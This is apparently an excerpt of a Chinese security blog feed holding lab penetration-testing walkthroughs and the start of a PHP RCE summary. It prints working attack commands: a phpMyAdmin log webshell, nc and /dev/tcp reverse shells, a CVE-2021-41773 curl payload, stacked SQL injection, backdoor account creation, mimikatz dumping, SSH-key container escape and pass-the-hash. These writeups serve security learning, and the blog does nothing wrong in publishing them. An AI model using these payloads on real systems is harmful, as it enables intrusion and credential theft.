off&quot;</span><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure><p><strong>注意！虽然命令执行后会报Failed，但实际防火墙已经关闭了</strong></p><p>再次执行上面的命令，成功拿下了域控</p><p><img src="/img/domain19.png" alt="domain3"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>信息收集</tag>
      
      <tag>横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一次简单的渗透测试的练习</title>
    <link href="/2024/06/15/zuoye/"/>
    <url>/2024/06/15/zuoye/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一次简单的渗透测试的练习</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><h2 id="192-168-18-200"><a href="#192-168-18-200" class="headerlink" title="192.168.18.200"></a>192.168.18.200</h2><p>扫描发现其存在phpmyadmin，尝试弱密码root&#x2F;root成功登入，利用日志文件写入一句话密码，在phpmyadmin的变量菜单中，对general log file的路径进行修改，修改为：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\phpStudy\PHPTutorial\WWW\test.php<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye1.png" alt="zuoye1"></p><p>在phpmyadmin的后台SQL菜单中，执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> &quot;ON&quot;;<br></code></pre></td></tr></table></figure><p>以保持日志状态的开启</p><p>再在SQL菜单中，执行命令写入木马：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;test&#x27;]);?&gt;&quot;;<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye2.png" alt="zuoye1"></p><p>使用蚁剑成功连接</p><p><img src="/img/zuoye3.png" alt="zuoye1"></p><p>连接后传入nc并弹shell到本地</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span>.exe <span class="hljs-number">192.168.22.113</span> <span class="hljs-number">7777</span> -e cmd.exe<br></code></pre></td></tr></table></figure><p>拿到shell后，重新创建账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span> /add<br></code></pre></td></tr></table></figure><p>并将其添加进管理组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup administrators <span class="hljs-built_in">test</span> /add<br></code></pre></td></tr></table></figure><p>使用Windows自带的远程桌面连接3389端口，成功连接上远程桌面，然后上传mimikatz，使用mimikatz成功跑出Administrator用户的密码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlas::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye4.png" alt="zuoye1"></p><p>使用此密码，成功获得管理员控制权限</p><p>查看发现还存在一张网卡192.168.22.2</p><p>上传lscan对其C段进行扫描，发现内网中还存在有一台主机192.168.22.3，发现其445端口开放，可能存在ms17-010（永恒之蓝）漏洞，在192.168.18.200机器上进行流量转发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.0.200 <span class="hljs-attribute">listenport</span>=445 <span class="hljs-attribute">connectaddress</span>=192.168.22.3<span class="hljs-built_in"> ip </span><span class="hljs-attribute">connectport</span>=445<br><br>netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.0.200 <span class="hljs-attribute">listenport</span>=4444 <span class="hljs-attribute">connectaddress</span>=192.168.22.3<span class="hljs-built_in"> ip </span><span class="hljs-attribute">connectport</span>=4444<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye8.png" alt="zuoye1"></p><p>使用msfconsole进行探测，发现果然存在ms17-010漏洞，设置Payload进行攻击利用，成功得到shell</p><p><img src="/img/zuoye9.png" alt="zuoye1"></p><h2 id="192-168-18-201"><a href="#192-168-18-201" class="headerlink" title="192.168.18.201"></a>192.168.18.201</h2><p>使用默认端口访问phpstudy后台运维系统页面，发现返回404 Not Found，访问&#x2F;user&#x2F;login路径也是404 Not Found，在此处抓包添加内容：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">X-Requested-<span class="hljs-keyword">With</span>: XMLHttpRequest<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye5.png" alt="zuoye1"></p><p>访问到登录页面，采用堆叠注入更改密码，构造Payload：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">admin&#x27;;<span class="hljs-keyword">UPDATE</span> ADMINS <span class="hljs-keyword">set</span> <span class="hljs-keyword">PASSWORD</span> = <span class="hljs-string">&#x27;c26be8aaf53b15054896983b43eb6a65&#x27;</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;--<br></code></pre></td></tr></table></figure><p>成功修改admin账户密码为123456</p><p><img src="/img/zuoye6.png" alt="zuoye1"></p><p>无视报错，使用admin&#x2F;123456登录成功，若出现404 Not Found只需要重新抓包添加</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">X-Requested-<span class="hljs-keyword">With</span>: XMLHttpRequest<br></code></pre></td></tr></table></figure><p>即可，在计划任务菜单处，写入定时任务弹shell，成功在本地拿到root权限的shell</p><p><img src="/img/zuoye7.png" alt="zuoye1"></p><h2 id="192-168-18-202"><a href="#192-168-18-202" class="headerlink" title="192.168.18.202"></a>192.168.18.202</h2><p>存在Thinkphp5，该版本漏洞较多，使用<a href="https://github.com/bewhale/thinkphp_gui_tools">bewhale</a>检测发现存在<strong>ThinkPHP5 SQL注入漏洞</strong>、<strong>Thinkphp5远程代码执行</strong>、<strong>Thinkphp5文件包含漏洞</strong>、<strong>Thinkphp5数据库账户泄露漏洞</strong>等，直接用bewhale进行利用，成功拿到shell</p><h2 id="192-168-18-203"><a href="#192-168-18-203" class="headerlink" title="192.168.18.203"></a>192.168.18.203</h2><p>探测发现该IP的80端口下存在Apache服务且版本为2.4.49，该版本存在CVE-2021-41773路径穿越漏洞，直接反弹shell</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -v --data <span class="hljs-string">&quot;echo;bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1&quot;</span> <span class="hljs-string">&quot;http://192.168.18.203/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/zuoye10.png" alt="zuoye1"></p><p>该IP的8080端口下存在Joomla系统，存在Apache Kafka Clients JNDI注入漏洞CVE-2023-25194</p><p>利用JNDIExploit可以实现攻击，成功反弹shell，得到的权限为root</p><p><img src="/img/zuoye11.png" alt="zuoye1"></p><p>该IP的8888端口下存在Joomla系统，访问其后台管理页面&#x2F;administrator，通过系统中的网站模板选项，可以在其模板中添加木马，使用蚁剑成功连接</p><p><img src="/img/zuoye12.png" alt="zuoye1"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网横向</tag>
      
      <tag>CVE</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透靶场-How2MoveLaterally</title>
    <link href="/2024/06/07/How2MoveLaterally/"/>
    <url>/2024/06/07/How2MoveLaterally/</url>
    
    <content type="html"><![CDATA[<h1 id="How2MoveLaterally"><a href="#How2MoveLaterally" class="headerlink" title="How2MoveLaterally"></a>How2MoveLaterally</h1><p>本环境是<a href="https://www.xbitsplatform.com/">xbitsplatform</a>靶场平台的基础环境之一，主要考察横向移动的知识点。从 linux 外围打点开始，经历几次横向移动后最后获得域管权限。</p><p>参考资料：<a href="https://www.freebuf.com/articles/web/369610.html">https://www.freebuf.com/articles/web/369610.html</a></p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="连接VPN"><a href="#连接VPN" class="headerlink" title="连接VPN"></a>连接VPN</h3><p>在<a href="https://www.xbitsplatform.com/">xbitsplatform</a>靶场输入<code>ls</code>，然后<code>cat How2MoveLaterally.txt</code>得到<code>.ovpn</code>文件，进行openvpn连接（连接的用户名和密码为文件名称，用户名：Anonymous 密码：helloworld）</p><h3 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h3><p>成功连接上VPN后，输入<code>route</code>对其路由进行查看，可以得到靶场的入口<code>IP：10.0.2.0</code>，使用<code>goby</code>工具对其进行C段扫描，成功得到相关存活IP，访问其中开放80端口的<code>10.0.2.152</code></p><p><img src="/img/yushentou1.png" alt="yushentou1"></p><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>发现10.0.2.152为Cacti框架，且为1.2.22版本，在<a href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Cacti%20%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-46169.md">漏洞库</a>中发现其存在一个前台命令注入的漏洞，尝试利用，成功写入木马</p><p><img src="/img/yushentou2.png" alt="yushentou2"></p><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p>写入木马后，用蚁剑对其进行连接，发现在根目录存在<code>.dockerenv</code>，知道目前在docker容器内，访问<code>/dev</code>目录，发现其中存在很多文件，猜测docker容器为特权模式启动，可能存在逃逸，当前用户为<code>www-data</code>，权限较低，尝试进行提权</p><p>查找SUID文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>存在特殊文件<code>find</code>，<a href="https://gtfobins.github.io/">GTFOBins</a>查看如何利用</p><p>执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -exec /bin/sh -p -c whoami \; -quit<br></code></pre></td></tr></table></figure><p>成功提权</p><p><img src="/img/yushentou4.png" alt="yushentou4"></p><h3 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h3><p>在&#x2F;mnt目录下发现了一个已经挂载的目录，并且可读</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -exec /bin/sh -p -c &#x27;ls /mnt/cacti&#x27; \; -quit<br></code></pre></td></tr></table></figure><p>采取写入公钥的办法进行登录，使用<code>MobaXterm</code>生成一个公钥，并使用base64进行加密，传入<code>/mnt/cacti/root/.ssh/authorized_keys</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -exec /bin/sh -p -c &#x27;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEMitBNDM2TVAxbWZDRWZUL2hrd05vd1dJV1ZiZURDNWIzbDExRnpGc1l6M01PMityM1JPUDRXc09zdW9YQ2o0cjNwRXkxWDkwR1NoY2d6dmJ6VjJTMGc5UkJITmFqMXZ4NHBUZXpMOXpIeitiUXJseHJFR3J3KzlpVnUzNlMyR1NZcGNoUWxHZDJyQjFTQm1RT2QzZEwySURtdktVU01iamNjbEZaTGo4NnJhSHZEeVd0TitaT2xsUFAvcW9icmRuRVMzTnFzYlE2UVppUmJ2MGdqejRRSHZ4Vi9ZbmNCTzNvc0oxdVcwZ2pzWlR3OVhGSUxlMUJBeWNFeDFxMXJ0ejJKTEYyNjJkYTN6eVd1eXNYRldWNzRIM1Y2WTRzQzd2OWNTUGRvRHlMNnZmNGtFVlNHM1FQQzc1bXdzczdyY3FtWWJkUXp3cURsTGgrTlhBVEdZSDEgcnNhLWtleS0yMDI0MDYxMQ== | base64 -d &gt; /mnt/cacti/root/.ssh/authorized_keys&#x27; \; -quit<br></code></pre></td></tr></table></figure><p>成功连接</p><p><img src="/img/yushentou5.png" alt="yushentou5"></p><h3 id="Linux域信息搜集"><a href="#Linux域信息搜集" class="headerlink" title="Linux域信息搜集"></a>Linux域信息搜集</h3><p>查看dns，显示存在域，域控为<code>10.0.2.100</code></p><p>尝试ping，返回的<code>ttl</code>值为128，可知为Windows域</p><p><strong>Windows操作系统的初始TTL值为128，而Linux和Unix系统的初始TTL值为64</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/resolv.conf<br></code></pre></td></tr></table></figure><p><img src="/img/yushentou6.png" alt="yushentou6"></p><p>查看具体的<code>ldap</code>配置，可知域为<code>MOVE.LAB</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/krb5.conf<br></code></pre></td></tr></table></figure><p><img src="/img/yushentou7.png" alt="yushentou7"></p><p>搜索相关目录，尝试寻找和域相关的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep -rn move.lab /etc<br>grep -rn move.lab /var/www/html<br></code></pre></td></tr></table></figure><p><img src="/img/yushentou8.png" alt="yushentou8"></p><p>得到了相关有效信息：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">域名：<span class="hljs-keyword">move</span>.<span class="hljs-keyword">lab</span>  <br>域控机器IP：10.0.2.100  <br>存在域账户：linux_ldap<br></code></pre></td></tr></table></figure><p>如果可以拿到 linux_ldap 这个用户的身份就可以先将域的 ldap 信息导出，在&#x2F;tmp 目录下发现了 linux_ldap 用户缓存的票据：</p><p><img src="/img/yushentou9.png" alt="yushentou9"></p><p>尝试设置环境变量为这个票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export KRB5CCNAME=/tmp/krb5cc_1680801105<br></code></pre></td></tr></table></figure><p>使用 ldapsearch 导出信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldapsearch  -b &quot;dc=move,dc=lab&quot; -H ldap://10.0.2.100<br></code></pre></td></tr></table></figure><p>但显示认证失败</p><p><img src="/img/yushentou10.png" alt="yushentou10"></p><p>看来这些工具并不支持票据认证，使用 <a href="https://github.com/ropnop/impacket_static_binaries">impacket</a> 工具尝试，这里直接使用打包好的 elf 程序</p><p><strong>elf文件：目标文件再不同的系统或平台上具有不同的命名格式，在Unix和X86-64 Linux上称为ELF(Executable and Linkable Format, ELF)</strong></p><p>通过<code>/etc/krb5.keytab</code>利用<code>keytabextract.py</code>获取到了Linux机器的<code>hash</code></p><p>这样我们就可以用这个机器的身份来搜集 ldap 信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./GetADUsers_linux_x86_64  move.lab/cacti\$ -hashes 7eb5e976f35341c3a9aa667a7a701ec0:7eb5e976f35341c3a9aa667a7a701ec0  -all<br></code></pre></td></tr></table></figure><p>但<code>impacket</code>对于 <code>ldap</code> 信息搜集的不全，只有枚举用户的功能</p><p>使用<code>mimikatz</code>进行本地<code>PTH</code>（Pass-The-Hash哈希传递）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sekurlsa::pth /domain:move.lab /dc:dc.move.lab /user:cacti$ /ntlm:7eb5e976f35341c3a9aa667a7a701ec0<br></code></pre></td></tr></table></figure><p>使用<code>AdFind</code>成功导出<code>ldap</code>的信息</p><p><img src="/img/yushentou11.png" alt="yushentou11"></p><h3 id="定位域用户机器"><a href="#定位域用户机器" class="headerlink" title="定位域用户机器"></a>定位域用户机器</h3>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
      <tag>docker逃逸</tag>
      
      <tag>内网横向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE总结</title>
    <link href="/2024/06/02/rce/"/>
    <url>/2024/06/02/rce/</url>
    
    <content type="html"><![CDATA[<p><strong>原文链接：<a href="https://paper.seebug.org/3162/">https://paper.seebug.org/3162/</a></strong></p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>在计算机安全中，任意代码执行(RCE)是攻击者在目标机器或目标进程中运行攻击者选择的任何命令或代码的能力。任意代码执行漏洞是软件或硬件中允许任意代码执行的安全漏洞。设计来利用这种漏洞的程序被称为任意代码执行漏洞。通过网络(特别是通过Internet等广域网)触发任意代码执行的能力通常被称为远程代码执行(RCE)</p><h2 id="shell符号使用"><a href="#shell符号使用" class="headerlink" title="shell符号使用"></a>shell符号使用</h2><p>在执行命令当中，我们会用到很多的shell符号，符号的用法如下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2 只执行cmd2 </span><br>cmd1 <span class="hljs-string">|| cmd2 只有当cmd1执行失败后，cmd2才被执行 </span><br>cmd1 <span class="hljs-meta">&amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2 </span><br>cmd1 <span class="hljs-meta">&amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2</span><br></code></pre></td></tr></table></figure><p>Linux中支持分号进行拼接执行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cmd1</span> ; <span class="hljs-attribute">cmd2</span> <br></code></pre></td></tr></table></figure><p>PHP中支持<code>反引号</code>拼接执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> `whoami`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="常规RCE"><a href="#常规RCE" class="headerlink" title="常规RCE"></a>常规RCE</h1><h2 id="基础RCE"><a href="#基础RCE" class="headerlink" title="基础RCE"></a>基础RCE</h2><h3 id="PHP基础命令-代码执行函数"><a href="#PHP基础命令-代码执行函数" class="headerlink" title="PHP基础命令&#x2F;代码执行函数"></a>PHP基础命令&#x2F;代码执行函数</h3><p>该方式最为常见，也是最为经典的方式，开发者因为没有对命令执行函数进行过滤，导致用户可以恶意传参造成的RCE</p><p>PHP下直接执行<strong>系统命令</strong>的函数如下：</p><h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>用于执行一个外部命令。它只返回命令的最后一行输出。可以通过一个可选的参数来获取命令的所有输出。还可以通过另一个可选的参数来获取命令的返回状态</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>同样用于执行外部命令。会返回命令的完整输出作为一个字符串。不提供命令的返回状态</p><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>也是用于执行外部命令。它会立即显示输出（适合用于产生大量输出的命令）。返回命令的最后一行输出。可以通过一个可选的参数来获取命令的返回状态</p><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>用于执行外部命令，并直接将原始输出传递给浏览器。常用于执行二进制文件或者需要直接传递数据流的情况（例如，输出图像或音频流）。不返回任何输出，但可以通过一个可选的参数来获取命令的返回状态</p><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>一种简便的语法，用于在PHP代码中直接执行外部命令。类似于<code>shell_exec</code>，会捕获并返回命令的完整输出</p><h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态</p><h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><p>PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 <code>ob_end_flush()</code> 来发送缓冲区内容至浏览器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;echo 1&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;echo 2&#x27;</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;echo 3&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&#x27;echo 4&#x27;</span>);<br><span class="hljs-keyword">echo</span> `<span class="hljs-keyword">echo</span> <span class="hljs-number">5</span>`;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&#x27;echo 6&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>)&#123;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$test</span>))&#123;<br>        <span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$test</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$test</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;echo&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;7&quot;</span>;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>执行PHP代码</strong>的命令如下：</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回</p><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>用于测试一个表达式是否为真。如果表达式为假，会抛出一个警告或异常（取决于 PHP 配置）。通常用于调试和测试目的</p><p><strong>注意！！！</strong>此函数在在PHP8已经被移除了，以下是官方介绍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span><span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span>|<span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$description</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>assertion可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。警告在 PHP 8.0.0 之前，如果assertion 是 <code>string</code>，将解释为 PHP 代码，并通过 <code>eval()</code> 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除</p><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><p>用于调用一个回调函数，该函数可以是一个函数名或闭包。可以传递多个参数给回调函数。返回回调函数的返回值。适用于动态函数调用</p><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>用于创建匿名（lambda-style）函数。接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用</p><p><strong>注意！！！</strong>同assert，已在PHP7.2弃用，PHP8.0被移除</p><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h4><p>用于将回调函数应用于数组的每个元素。接受一个回调函数和一个或多个数组。返回一个新数组，数组元素是回调函数应用于原始元素的结果。适用于转换或处理数组元素</p><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><p>用于调用回调函数，并将参数作为数组传递。接受两个参数：回调函数和参数数组。返回回调函数的返回值。适用于动态参数数量的函数调用</p><h4 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h4><p>用于对数组进行自定义排序，接受数组和比较函数作为参数。比较函数确定元素间的排序顺序，排序后的数组不保留原始键名。适用于根据用户定义的规则排序数组元素</p><h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h4><p>用于过滤数组元素，接受数组和可选的回调函数作为参数。如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素</p><h4 id="array-reduce"><a href="#array-reduce" class="headerlink" title="array_reduce"></a>array_reduce</h4><p>用于迭代一个数组，并通过回调函数将数组的元素逐一减少到单一值。接受三个参数：一个数组、一个回调函数和一个可选的初始值。回调函数接受两个参数：一个是携带结果的累加器，另一个是当前数组元素。返回通过累加器得到的最终值</p><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p>用于执行正则表达式的搜索和替换。接受三个参数：模式（正则表达式）、替换值和目标字符串。可以是单个字符串或数组。返回修改后的字符串或数组。适用于基于模式匹配修改文本内容。(&#x2F;e的代码执行版本在5.6版本后被移除)</p><h4 id="符号"><a href="#符号" class="headerlink" title="$符号"></a>$符号</h4><p>在 PHP 中，<code>$&#123;&#125;</code> 语法本质上是用于复杂的变量解析，通常在字符串内用来解析变量或表达式。然而，在一些特殊情况下，如果配合 eval 或其他动态执行代码的功能，<code>$&#123;&#125;</code> 可以被用来间接执行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//eval</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-comment">//assert</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//call_user_func</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//create_function</span><br><span class="hljs-variable">$command1</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-variable">$command1</span>();<br><span class="hljs-comment">//array_map</span><br><span class="hljs-variable">$command2</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-variable">$command2</span>);<br><span class="hljs-comment">//call_user_func_array</span><br><span class="hljs-variable">$command3</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$arguments</span> = [<span 